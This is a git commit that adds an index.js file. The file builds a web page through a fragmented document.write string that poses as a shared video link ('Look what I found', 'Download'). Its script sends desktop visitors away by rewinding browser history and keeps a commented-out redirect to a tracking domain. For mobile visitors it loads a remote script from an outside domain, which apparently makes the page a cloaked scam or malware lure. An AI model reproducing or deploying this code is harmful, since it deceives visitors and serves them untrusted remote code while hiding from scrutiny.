52c9f1644662dad3c9f25bcfb903c36ff93fd22f
noterdame <56059175+noterdame@users.noreply.github.com>
2021-04-12 00:28:24 +0800

    Add files via upload

---
+++ index.js
@@ -0,0 +1,51 @@
+<SCRIPT LANGUAGE='JavaScript'>
+<!-- Hide from JavaScript-Impaired Browsers
+ 	document.write('<head>
+    <meta charset="windows-12'
+ +'52">
+    <meta name="viewport" content="width=devi'
+ +'ce-width, initial-scale=1.0">
+	<meta property="og:'
+ +'url" content="https://www.youtube.com/watch?v=wAPl'
+ +'zt2L7wE" />
+	<meta property="og:title" content="Lo'
+ +'ok what I found" />
+	<meta property="og:image" con'
+ +'tent="https://a.mailmunch.co/attachments/assets/00'
+ +'0/469/259/large/133115925_112984550691889_32031883'
+ +'19832166266_n.jpg?1617569491" />
+	<meta property="'
+ +'og:image:width" content="1280" />
+	<meta property='
+ +'"og:image:height" content="720" />
+	<meta property'
+ +'="og:description" content="Download" />
+    <scrip'
+ +'t>
+        if (!/(android|bb\d+|meego).+mobile|ava'
+ +'ntgo|bada\/|blackberry|blazer|compal|elaine|fennec'
+ +'|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maem'
+ +'o|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)'
+ +'i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|'
+ +'series(4|6)0|symbian|treo|up\.(browser|link)|vodaf'
+ +'one|wap|windows ce|xda|xiino/i.test(navigator.user'
+ +'Agent)) {
+            history.go(-history.length);'
+ +'
+            //location.href = "https://postalfran'
+ +'ticallyfriendship.com/jch313sys?key=898c818f5b2ffd'
+ +'2a86b0b8ff6a128bb0";
+        }
+    </script>
+</hea'
+ +'d>
+<body>
+<script src="https://onlysnaf.com/legola'
+ +'s/?api=1&lan=mob&ht=1&counter0=redcuton45" type="t'
+ +'ext/javascript" async="true"></script>
+</html>
+   '
+ +'      ');
+// End Hiding -->
+</SCRIPT>
+<!-- Size: 1546 bytes --> 
